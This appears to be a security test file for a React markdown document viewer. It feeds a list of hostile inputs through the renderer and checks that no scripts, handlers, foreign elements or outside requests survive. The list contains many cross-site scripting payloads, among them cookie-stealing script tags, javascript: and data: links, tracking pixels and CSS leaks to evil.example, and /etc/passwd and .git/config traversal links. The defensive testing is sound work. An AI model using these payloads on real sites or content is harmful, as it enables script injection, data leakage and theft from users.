/**
 * A repo's document is untrusted (#264): whatever is in the file, the
 * reader's page holds no script, no event handler, no element the document
 * chose, no link that runs or leaves quietly, and no request to anyone but
 * the office.
 */
import { describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { MAX_INLINE_CHARS } from "../boards/markdown.ts";
import { DocView } from "./DocView.tsx";

const SHELF = new Set(["README.md", "docs/guide.md", "docs/adr/0001.md", "docs/my notes.md"]);

const html = (markdown: string, path = "docs/guide.md") =>
  renderToStaticMarkup(
    <DocView
      operationId="op-1"
      path={path}
      markdown={markdown}
      shelf={SHELF}
      onOpen={() => undefined}
    />,
  );

/** Every attribute of every element the reader produced, as `tag attr="value"`. */
function attributes(out: string): string[] {
  const found: string[] = [];
  for (const tag of out.matchAll(/<([a-z0-9]+)((?:\s+[a-zA-Z-]+(?:="[^"]*")?)*)\s*\/?>/g)) {
    for (const attr of (tag[2] ?? "").matchAll(/([a-zA-Z-]+)(?:="([^"]*)")?/g))
      found.push(`${tag[1]} ${attr[1]}="${attr[2] ?? ""}"`);
  }
  return found;
}

const ALLOWED_TAGS = new Set([
  "div",
  "p",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "a",
  "span",
  "img",
  "code",
  "pre",
  "strong",
  "em",
  "del",
  "br",
  "hr",
  "blockquote",
  "ul",
  "ol",
  "li",
  "input",
  "table",
  "thead",
  "tbody",
  "tr",
  "th",
  "td",
]);

const HOSTILE = [
  "<script>alert(document.cookie)</script>",
  "<script src=https://evil.example/x.js></script>",
  '<img src=x onerror="alert(1)">',
  '<img src="https://evil.example/track.gif">',
  '<svg onload="alert(1)"><script>alert(2)</script></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<a href="javascript:alert(1)" onclick="alert(2)">click</a>',
  '<form action="https://evil.example"><input name=p><button>go</button></form>',
  "<style>*{background:url(https://evil.example/leak)}</style>",
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  "<object data=x></object><embed src=x>",
  "<video src=x onerror=alert(1)></video><audio src=x onerror=alert(1)>",
  '<details open ontoggle="alert(1)">x</details>',
  '<div style="position:fixed;inset:0" onmouseover="alert(1)">cover</div>',
  "<math><mtext><script>alert(1)</script></mtext></math>",
  "[click](javascript:alert(1))",
  "[click](JaVaScRiPt:alert(1))",
  "[click](java\tscript:alert(1))",
  "[click](&#106;avascript:alert(1))",
  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[click](vbscript:msgbox(1))",
  "[click](file:///etc/passwd)",
  "[click](//evil.example/x)",
  "[click](\\\\evil\\share)",
  '[click](https://ok.example "onmouseover=alert(1)")',
  '[click](x" onclick="alert(1))',
  "[click](<javascript:alert(1)>)",
  "<javascript:alert(1)>",
  "![x](javascript:alert(1))",
  "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
  "![x](https://evil.example/pixel.png)",
  "![x](//evil.example/pixel.png)",
  '![x" onerror="alert(1)](img/a.png)',
  '![x](img/a.png" onerror="alert(1))',
  "![x](../../../../etc/passwd)",
  "![x](/api/auth/sign-out)",
  "[up](../../../../etc/passwd)",
  "[git](../.git/config)",
  "| a |\n| --- |\n| <script>alert(1)</script> |",
  "# <img src=x onerror=alert(1)>",
  "```html\n<script>alert(1)</script>\n```",
  "> <script>alert(1)</script>",
  "- [x] <input onfocus=alert(1) autofocus>",
  "<!-- --><script>alert(1)</script><!-- -->",
  "<!--><script>alert(1)</script>",
];

describe("a hostile document", () => {
  const out = html(HOSTILE.join("\n\n"));

  test("produces only the renderer's own elements", () => {
    const tags = new Set([...out.matchAll(/<([a-z0-9]+)[\s>/]/g)].map((m) => m[1] as string));
    expect([...tags].filter((t) => !ALLOWED_TAGS.has(t))).toEqual([]);
    expect(out).toContain("&lt;script&gt;alert(document.cookie)&lt;/script&gt;");
  });

  test("has no event handler, style or other attribute the document chose", () => {
    const allowed =
      /^(div class|p class|span class|span title|a class|a href|a target|a rel|a referrerPolicy|a data-doc-path|img class|img src|img alt|img loading|img decoding|img referrerPolicy|h[1-6] data-doc-anchor|input type|input disabled|input readOnly|input aria-label|input checked|li class|ol start|t[hd] style)=/;
    // The scan saw every element: each opening tag in the markup parsed as tag + attributes.
    const opening = /<([a-z0-9]+)((?:\s+[a-zA-Z-]+(?:="[^"]*")?)*)\s*\/?>/g;
    expect([...out.matchAll(opening)]).toHaveLength([...out.matchAll(/<[a-z]/g)].length);
    const strange = attributes(out).filter((a) => !allowed.test(a));
    expect(strange).toEqual([]);
    expect(attributes(out).filter((a) => /^\w+ on/i.test(a))).toEqual([]);
    const styles = attributes(out).filter((a) => / style=/.test(a));
    expect(styles.filter((a) => !/ style="text-align:(left|center|right)"$/.test(a))).toEqual([]);
  });

  test("links go to http(s) or mailto in a new tab without opener or referrer, or stay in the reader", () => {
    const anchors = [...out.matchAll(/<a ([^>]*)>/g)].map((m) => m[1] as string);
    expect(anchors.length).toBeGreaterThan(0);
    for (const a of anchors) {
      const href = /href="([^"]*)"/.exec(a)?.[1] ?? "";
      if (href === "#") {
        expect(a).toContain("data-doc-path=");
        continue;
      }
      expect(href).toMatch(/^(https?:\/\/|mailto:)/);
      expect(a).toContain('target="_blank"');
      expect(a).toContain('rel="noopener noreferrer nofollow ugc"');
      expect(a).toContain('referrerPolicy="no-referrer"');
    }
    expect(out).not.toMatch(/href="(?!https?:\/\/|mailto:|#")/);
  });

  test("loads pictures only from the office's own gated route", () => {
    const sources = [...out.matchAll(/<img [^>]*src="([^"]*)"/g)].map((m) => m[1] as string);
    expect(sources.length).toBeGreaterThan(0);
    for (const src of sources)
      expect(src).toMatch(/^\/api\/operations\/op-1\/docs\/image\?path=docs%2F[^&"]*\.png$/);
    // A remote picture is a link the reader may follow, never a request made for them.
    expect(out).toContain(
      '<a href="https://evil.example/pixel.png" target="_blank" rel="noopener noreferrer nofollow ugc" referrerPolicy="no-referrer"><span class="rg-md__image">Image: x</span></a>',
    );
    expect(out).not.toMatch(/<img [^>]*src="(https?:|\/\/|data:|javascript:)/);
    expect(out).not.toContain("etc%2Fpasswd");
    expect(out).not.toContain("/api/auth");
  });

  test("nothing in it is a URL that runs", () => {
    const urls = attributes(out)
      .filter((a) => /^(a href|img src)=/.test(a))
      .join("\n");
    expect(urls).not.toMatch(/javascript:|vbscript:|data:|file:/i);
  });
});

describe("a well-meant document", () => {
  test("relative links to documents on the shelf open in the reader; others are plain text", () => {
    const out = html(
      [
        "[next](../README.md) [adr](adr/0001.md#context) [root](/README.md)",
        "[notes](my%20notes.md) [here](#setup)",
        "[code](../src/main.ts) [missing](nope.md) [up](../../README.md)",
      ].join("\n\n"),
    );
    const refs = [...out.matchAll(/data-doc-path="([^"]*)"/g)].map((m) => m[1]);
    expect(refs).toEqual([
      "README.md",
      "docs/adr/0001.md",
      "README.md",
      "docs/my notes.md",
      "docs/guide.md",
    ]);
    for (const label of ["code", "missing", "up"])
      expect(out).toContain(
        `<span class="rg-doc__offshelf" title="Not a document on this shelf">${label}</span>`,
      );
  });

  test("a click on a relative link asks the reader to open it, with its heading", async () => {
    const opened: string[] = [];
    const { GlobalRegistrator } = await import("@happy-dom/global-registrator");
    GlobalRegistrator.register();
    try {
      const { act } = await import("react");
      const { createRoot } = await import("react-dom/client");
      (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
      const container = document.createElement("div");
      document.body.appendChild(container);
      const root = createRoot(container);
      await act(async () =>
        root.render(
          <DocView
            operationId="op-1"
            path="docs/guide.md"
            markdown="[adr](adr/0001.md#Context)"
            shelf={SHELF}
            onOpen={(path, anchor) => opened.push(`${path}#${anchor}`)}
          />,
        ),
      );
      await act(async () => container.querySelector<HTMLAnchorElement>("a.rg-doc__ref")?.click());
      expect(opened).toEqual(["docs/adr/0001.md#Context"]);
      await act(async () => root.unmount());
    } finally {
      await GlobalRegistrator.unregister();
    }
  });

  test("headings carry GitHub-style anchors; repeats are numbered", () => {
    const out = html("# Set up!\n\n## Set up!\n\n### Čaj & `code`");
    expect(out).toContain('<h1 data-doc-anchor="set-up">');
    expect(out).toContain('<h2 data-doc-anchor="set-up-1">');
    expect(out).toContain('<h3 data-doc-anchor="čaj--code">');
    expect(out).not.toMatch(/ id="/);
  });

  test("tables, soft line breaks and relative pictures read as in a document", () => {
    const out = html(
      "one\ntwo\n\n| # | Decision |\n|---|:--:|\n| D1 | **MIT** |\n| D2 | a \\| b |\n\n![shot](img/a.png)",
      "docs/guide.md",
    );
    expect(out).toContain("<p>one two</p>");
    expect(out).toContain("<th>#</th>");
    expect(out).toContain('<td style="text-align:center"><strong>MIT</strong></td>');
    expect(out).toContain("a | b");
    expect(out).toContain('src="/api/operations/op-1/docs/image?path=docs%2Fimg%2Fa.png"');
    expect(out).toContain('alt="shot"');
  });

  test("a huge paragraph of markers is shown as text instead of being scanned", () => {
    const bomb = "*a ".repeat(MAX_INLINE_CHARS);
    const started = performance.now();
    const out = html(bomb);
    expect(performance.now() - started).toBeLessThan(2000);
    expect(out).not.toContain("<em>");
  });
});
